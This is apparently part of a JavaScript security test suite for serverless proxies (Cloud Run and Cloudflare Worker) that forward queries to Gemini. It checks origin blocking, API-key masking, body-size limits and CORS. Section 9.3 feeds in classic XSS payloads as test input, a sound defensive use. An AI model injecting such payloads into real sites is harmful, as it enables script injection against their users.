  lastUpstreamHeaders = init?.headers || {};
  return new Response(JSON.stringify(upstreamBody), { status: upstreamStatus });
};
console.error = () => {};

createRequire(path.join(tmp, 'index.js'))('./index.js');

const cloudRunWith = async (body, headers = {}, peer = '192.0.2.1') => {
  const res = {
    statusCode: 200,
    headers: {},
    set(k, v) { this.headers[k] = v; },
    status(code) { this.statusCode = code; return this; },
    json(b) { this.body = b; },
    send() {}
  };
  await globalThis.__securitySearchHandler({
    method: 'POST',
    body,
    headers,
    get: k => headers[k.toLowerCase()] || headers[k],
    socket: peer ? { remoteAddress: peer } : undefined
  }, res);
  return res;
};

const cloudflareWith = async (body, headers = {}, env = {}) => {
  const res = await worker.fetch(
    new Request('https://fixture.invalid', {
      method: 'POST',
      body: typeof body === 'string' ? body : JSON.stringify(body),
      headers
    }),
    { GEMINI_API_KEY: 'test-placeholder-key', ...env }
  );
  let parsedBody;
  try {
    parsedBody = await res.json();
  } catch {
    parsedBody = null;
  }
  return {
    statusCode: res.status,
    body: parsedBody,
    allow: res.headers.get('Access-Control-Allow-Origin')
  };
};

try {
  // 9.1 Origin enforcement in both proxies
  const crBadOrigin = await cloudRunWith({ query: 'Toyota' }, { origin: 'https://malicious.example' });
  assert.equal(crBadOrigin.statusCode, 403, 'Cloud Run rejects untrusted origin with 403');
  assert.equal(crBadOrigin.body.error, 'forbidden');

  const cfBadOrigin = await cloudflareWith({ query: 'Toyota' }, { Origin: 'https://malicious.example', 'Content-Type': 'application/json' });
  assert.equal(cfBadOrigin.statusCode, 403, 'Cloudflare Worker rejects untrusted origin with 403');
  assert.equal(cfBadOrigin.body.error, 'forbidden');

  const crGoodOrigin = await cloudRunWith({ query: 'Toyota' }, { origin: 'https://akila-w.github.io' });
  assert.equal(crGoodOrigin.statusCode, 200, 'Cloud Run accepts trusted origin');
  assert.notEqual(crGoodOrigin.statusCode, 403, 'Cloud Run trusted origin must not be 403');
  assert.equal(crGoodOrigin.headers['Access-Control-Allow-Origin'], 'https://akila-w.github.io');
  assert.equal(lastUpstreamHeaders['x-goog-api-key'], 'test-placeholder-key', 'Cloud Run sends key in x-goog-api-key header');
  assert.ok(!lastUpstreamUrl.includes('key='), 'Cloud Run upstream URL has no key parameter');

  const cfGoodOrigin = await cloudflareWith({ query: 'Toyota' }, { Origin: 'https://akila-w.github.io', 'Content-Type': 'application/json' });
  assert.equal(cfGoodOrigin.statusCode, 200, 'Cloudflare Worker accepts trusted origin');
  assert.notEqual(cfGoodOrigin.statusCode, 403, 'Cloudflare Worker trusted origin must not be 403');
  assert.equal(cfGoodOrigin.allow, 'https://akila-w.github.io');
  assert.equal(lastUpstreamHeaders['x-goog-api-key'], 'test-placeholder-key', 'Cloudflare Worker sends key in x-goog-api-key header');
  assert.ok(!lastUpstreamUrl.includes('key='), 'Cloudflare Worker upstream URL has no key parameter');

  // Explicit cases: no Origin -> 403 in search mode
  const crNoOrigin = await cloudRunWith({ query: 'Toyota' }, {});
  assert.equal(crNoOrigin.statusCode, 403, 'Cloud Run rejects search request with missing Origin with 403');
  assert.deepEqual(crNoOrigin.body, { error: 'forbidden', detail: 'Search requests must come from the VahanaIQ site' });

  const cfNoOrigin = await cloudflareWith({ query: 'Toyota' }, { 'Content-Type': 'application/json' });
  assert.equal(cfNoOrigin.statusCode, 403, 'Cloudflare Worker rejects search request with missing Origin with 403');
  assert.deepEqual(cfNoOrigin.body, { error: 'forbidden', detail: 'Search requests must come from the VahanaIQ site' });

  // 9.2 API key leakage prevention on upstream error
  upstreamStatus = 502;
  upstreamBody = { error: { message: 'Gemini upstream error: request failed with key=AIzaSySECRET_API_KEY_NEVER_LEAK' } };

  const crUpstreamErr = await cloudRunWith({ query: 'Toyota' }, { origin: 'https://akila-w.github.io' });
  assert.equal(crUpstreamErr.statusCode, 502);
  assert.notEqual(crUpstreamErr.statusCode, 403, 'Allowed origin with upstream error is 502, not 403');
  assert.ok(!JSON.stringify(crUpstreamErr.body).includes('AIzaSySECRET_API_KEY_NEVER_LEAK'), 'Cloud Run must mask API key');
  assert.ok(crUpstreamErr.body.detail.includes('key=[removed]'), 'Cloud Run must contain masked key=[removed]');

  const cfUpstreamErr = await cloudflareWith({ query: 'Toyota' }, { Origin: 'https://akila-w.github.io', 'Content-Type': 'application/json' });
  assert.equal(cfUpstreamErr.statusCode, 502);
  assert.notEqual(cfUpstreamErr.statusCode, 403, 'Allowed origin with upstream error is 502, not 403');
  assert.ok(!JSON.stringify(cfUpstreamErr.body).includes('AIzaSySECRET_API_KEY_NEVER_LEAK'), 'Cloudflare must mask API key');
  assert.ok(cfUpstreamErr.body.detail.includes('key=[removed]'), 'Cloudflare must contain masked key=[removed]');

  // 9.3 XSS payload within query string processed safely without crashing
  upstreamStatus = 200;
  upstreamBody = { candidates: [{ content: { parts: [{ text: '{"is_available_in_sri_lanka": true}' }] } }] };
  const crXssQuery = await cloudRunWith({ query: '<script>alert("xss")</script>' }, { origin: 'https://akila-w.github.io' });
  assert.equal(crXssQuery.statusCode, 200, 'Proxy accepts query string with script tags safely as text');

  const cfXssQuery = await cloudflareWith({ query: '<img src=x onerror=alert(1)>' }, { Origin: 'https://akila-w.github.io', 'Content-Type': 'application/json' });
  assert.equal(cfXssQuery.statusCode, 200, 'Cloudflare Worker processes XSS query string safely');

  // 9.4 Malformed JSON payload and Content-Type validation
  const cfMalformed = await cloudflareWith('{"broken_json": ', { Origin: 'https://akila-w.github.io', 'Content-Type': 'application/json' });
  assert.equal(cfMalformed.statusCode, 400, 'Cloudflare Worker catches malformed JSON body safely with 400');
  assert.equal(cfMalformed.body.error, 'bad_request');
  assert.equal(cfMalformed.body.detail, 'Malformed JSON body');
  assert.ok(!JSON.stringify(cfMalformed.body).includes('broken_json'), 'Cloudflare Worker must never echo the malformed body');

  const crMalformed = await cloudRunWith('{"broken_json": ', { origin: 'https://akila-w.github.io', 'content-type': 'application/json' });
  assert.equal(crMalformed.statusCode, 400, 'Cloud Run catches malformed JSON body safely with 400');
  assert.equal(crMalformed.body.error, 'bad_request');
  assert.equal(crMalformed.body.detail, 'Malformed JSON body');
  assert.ok(!JSON.stringify(crMalformed.body).includes('broken_json'), 'Cloud Run must never echo the malformed body');

  const cfBadContentType = await cloudflareWith({ query: 'Toyota' }, { Origin: 'https://akila-w.github.io', 'Content-Type': 'text/plain' });
  assert.equal(cfBadContentType.statusCode, 400, 'Cloudflare Worker rejects non-JSON Content-Type with 400');
  assert.equal(cfBadContentType.body.error, 'bad_request');

  const crBadContentType = await cloudRunWith({ query: 'Toyota' }, { origin: 'https://akila-w.github.io', 'content-type': 'text/plain' });
  assert.equal(crBadContentType.statusCode, 415, 'Cloud Run rejects non-JSON Content-Type with 415');
  assert.equal(crBadContentType.body.error, 'unsupported_media_type');

  // 9.5 Oversized and invalid image rejection through proxy endpoints
  const cfBadMime = await cloudflareWith({ image: { mimeType: 'image/svg+xml', data: 'PHN2Zz4=' } }, { Origin: 'https://akila-w.github.io', 'Content-Type': 'application/json' });
  assert.equal(cfBadMime.statusCode, 400, 'Cloudflare rejects SVG image upload');
  assert.equal(cfBadMime.body.error, 'bad_request');

  // PNG labelled image/jpeg is refused with 400
  const crMismatchedMime = await cloudRunWith(
    { image: { mimeType: 'image/jpeg', data: validImageSamples['image/png'] } },
    { origin: 'https://akila-w.github.io', 'content-type': 'application/json' }
  );
  assert.equal(crMismatchedMime.statusCode, 400, 'Cloud Run rejects PNG labelled image/jpeg with 400');
  assert.equal(crMismatchedMime.body.error, 'bad_request');

  // A full-size 4 MiB screenshot arrives as ~5.6 MB of base64. It must pass the body
  // gate (MAX_BODY_BYTES) and be accepted by validateImage (MAX_IMAGE_BYTES).
  const maxB64 = '/9j/' + 'A'.repeat(5592404 - 4); // decodes to 4,194,303 bytes
  assert.equal(Math.floor(maxB64.length * 3 / 4), MAX_IMAGE_BYTES - 1, 'fixture decodes to just under 4 MiB');
  assert.ok(Buffer.byteLength(JSON.stringify({ image: { mimeType: 'image/jpeg', data: maxB64 } }), 'utf8') < MAX_BODY_BYTES,
    'a full-size screenshot must fit inside the body ceiling');
  assert.equal(validateImage({ mimeType: 'image/jpeg', data: maxB64 }).valid, true, 'validateImage accepts a 4 MiB screenshot');

  const crMaxImage = await cloudRunWith(
    { image: { mimeType: 'image/jpeg', data: maxB64 } },
    { origin: 'https://akila-w.github.io', 'content-type': 'application/json' }
  );
  assert.notEqual(crMaxImage.statusCode, 413, 'a 4 MiB screenshot must not be refused as too large by the body gate');
  assert.notEqual(crMaxImage.body && crMaxImage.body.error, 'image_too_large', 'a full-size screenshot must not be refused as too large');

  // One byte-group over the decoded image limit is still refused by validateImage.
  const overB64 = '/9j/' + 'A'.repeat(5592408 - 4); // decodes to 4,194,306 bytes
  const crOverImage = await cloudRunWith(
    { image: { mimeType: 'image/jpeg', data: overB64 } },
    { origin: 'https://akila-w.github.io', 'content-type': 'application/json' }
  );
  assert.equal(crOverImage.statusCode, 413, 'an image above 4 MiB is refused with 413');
  assert.equal(crOverImage.body.error, 'image_too_large');

  // The body ceiling is measured in UTF-8 bytes, not UTF-16 characters: 3.1 million
  // two-byte characters serialise to 6.2 MB and must be refused, although the character
  // count (3,100,000) sits below the old 4,194,304-character check.
  const wideBody = { query: 'é'.repeat(3100000) };
  assert.ok(JSON.stringify(wideBody).length < MAX_BODY_BYTES, 'character count is below the ceiling');
  assert.ok(Buffer.byteLength(JSON.stringify(wideBody), 'utf8') > MAX_BODY_BYTES, 'byte count is above the ceiling');
  const crWideBody = await cloudRunWith(wideBody, { origin: 'https://akila-w.github.io', 'content-type': 'application/json' });
  assert.equal(crWideBody.statusCode, 413, 'a body above 6 MB of UTF-8 bytes is refused with 413');
  assert.equal(crWideBody.body.error, 'image_too_large');


  const cfOversized = await cloudflareWith({ image: { mimeType: 'image/jpeg', data: '/9j/' + 'A'.repeat(6000000) } }, { Origin: 'https://akila-w.github.io', 'Content-Type': 'application/json' });
  assert.equal(cfOversized.statusCode, 413, 'Cloudflare rejects oversized image upload');
  assert.equal(cfOversized.body.error, 'image_too_large');

  // 9.6 Raw Content-Length header guard (> 6 MB)
  const cfContentLen = await cloudflareWith({ query: 'Toyota' }, { Origin: 'https://akila-w.github.io', 'Content-Type': 'application/json', 'Content-Length': '7000000' });
  assert.equal(cfContentLen.statusCode, 413, 'Cloudflare rejects oversized Content-Length');
  assert.equal(cfContentLen.body.error, 'image_too_large');

  const crContentLen = await cloudRunWith({ query: 'Toyota' }, { origin: 'https://akila-w.github.io', 'content-length': '7000000' });
  assert.equal(crContentLen.statusCode, 413, 'Cloud Run rejects oversized Content-Length');
  assert.equal(crContentLen.body.error, 'image_too_large');

  // 9.7 OPTIONS preflight & CORS headers validation
  const crOptionsRes = { statusCode: 200, headers: {}, set(k, v) { this.headers[k] = v; }, status(c) { this.statusCode = c; return this; }, send() {} };
  await globalThis.__securitySearchHandler({
    method: 'OPTIONS',
    headers: { origin: 'https://akila-w.github.io' },
    get: k => k.toLowerCase() === 'origin' ? 'https://akila-w.github.io' : ''
  }, crOptionsRes);
  assert.equal(crOptionsRes.statusCode, 204, 'Cloud Run OPTIONS preflight returns 204');
  assert.ok(crOptionsRes.headers['Access-Control-Allow-Headers'].includes('X-Price-Token'), 'Cloud Run OPTIONS includes X-Price-Token');
  assert.ok(crOptionsRes.headers['Access-Control-Allow-Headers'].includes('Content-Type'), 'Cloud Run OPTIONS includes Content-Type');
  assert.equal(crOptionsRes.headers['Vary'], 'Origin', 'Cloud Run OPTIONS includes Vary: Origin');

  const cfOptionsRes = await worker.fetch(new Request('https://fixture.invalid', {
    method: 'OPTIONS',
    headers: { Origin: 'https://akila-w.github.io' }
  }), { GEMINI_API_KEY: 'test-placeholder-key' });
  assert.equal(cfOptionsRes.status, 200, 'Cloudflare Worker OPTIONS preflight returns 200');
  const cfAllowHeaders = cfOptionsRes.headers.get('Access-Control-Allow-Headers') || '';
  assert.ok(cfAllowHeaders.includes('X-Price-Token'), 'Cloudflare OPTIONS includes X-Price-Token');
  assert.ok(cfAllowHeaders.includes('Content-Type'), 'Cloudflare OPTIONS includes Content-Type');
  assert.equal(cfOptionsRes.headers.get('Access-Control-Max-Age'), '86400', 'Cloudflare OPTIONS includes Access-Control-Max-Age');
  assert.equal(cfOptionsRes.headers.get('Vary'), 'Origin', 'Cloudflare OPTIONS includes Vary: Origin');

  console.log('✓ Serverless Proxy Security Integration PASSED\n');
} finally {
  globalThis.fetch = realFetch;
  console.error = realError;
  if (previousKey === undefined) delete process.env.GEMINI_API_KEY; else process.env.GEMINI_API_KEY = previousKey;
  delete globalThis.__securitySearchHandler;
  fs.rmSync(tmp, { recursive: true, force: true });
}

// ============================================================================
// SUMMARY
// ============================================================================
console.log('==================================================');
console.log('ALL 9 SECURITY TEST SUITES PASSED SUCCESSFULLY! (100%)');
console.log('==================================================');
